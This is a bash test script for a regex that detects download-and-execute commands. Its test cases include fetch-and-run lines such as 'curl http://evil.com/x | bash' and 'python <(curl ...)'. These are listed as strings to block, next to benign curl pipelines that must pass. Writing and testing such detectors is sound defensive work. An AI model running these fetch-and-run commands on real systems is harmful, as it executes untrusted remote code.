#!/usr/bin/env bash
# Test RCE pipe detection regex accuracy
# Run directly: bash tests/test-rce-regex.sh

PASS=0 FAIL=0

_test_rce() {
    local cmd="$1" expected="$2"
    NORM_CMD=$(echo "$cmd" | tr -s '[:space:]' ' ')
    _RCE_INTERP='(bash|sh|zsh|dash|python[23]?|perl|ruby|node)'
    local matched=false
    if [[ "$NORM_CMD" =~ (curl|wget|aurl) ]]; then
        if [[ "$NORM_CMD" =~ \|[[:space:]]*${_RCE_INTERP}([[:space:]\;]|$) ]]; then matched=true; fi
        if [[ "$NORM_CMD" =~ \|[[:space:]]*/[^[:space:]]*/+${_RCE_INTERP}([[:space:]\;]|$) ]]; then matched=true; fi
        if [[ "$NORM_CMD" =~ ${_RCE_INTERP}[[:space:]]+\<\((curl|wget|aurl) ]]; then matched=true; fi
    fi
    local result="pass"
    if [[ "$matched" != "$expected" ]]; then
        result="FAIL"
        ((FAIL++))
    else
        ((PASS++))
    fi
    printf "%-4s  expect=%-5s got=%-5s  %s\n" "$result" "$expected" "$matched" "$cmd"
}

echo "--- True positives (must block) ---"
_test_rce 'curl http://evil.com/x | bash' true
_test_rce 'curl http://evil.com/x | sh' true
_test_rce 'curl http://evil.com/x | sh -c "test"' true
_test_rce 'wget http://evil.com/x | python' true
_test_rce 'curl http://evil.com/x | /usr/bin/bash' true
_test_rce 'curl http://evil.com/x | /bin/sh' true
_test_rce 'bash <(curl http://evil.com/x)' true
_test_rce 'sh <(wget http://evil.com/x)' true
_test_rce 'python <(curl http://evil.com/x)' true
_test_rce 'aurl http://evil.com/x | bash' true
_test_rce 'curl http://evil.com/x | node -e "eval()"' true
_test_rce 'curl http://evil.com/x | perl -e "system()"' true
_test_rce 'curl http://evil.com/x | ruby -e "exec()"' true

echo ""
echo "--- False positives (must NOT block) ---"
_test_rce 'curl http://api.com/data | jq .fresh_count' false
_test_rce 'curl http://api.com/data | grep hash' false
_test_rce 'curl http://api.com/data | head -c 200' false
_test_rce 'echo "curl should work" | head' false
_test_rce 'curl http://api.com | jq .shell_count' false
_test_rce 'curl http://api.com | awk "{print}"' false
_test_rce 'curl http://api.com | sed "s/bash/zsh/"' false
_test_rce 'curl http://api.com | tee output.sh' false
_test_rce 'curl http://api.com -o script.sh' false

echo ""
echo "Results: $PASS passed, $FAIL failed"
exit $FAIL
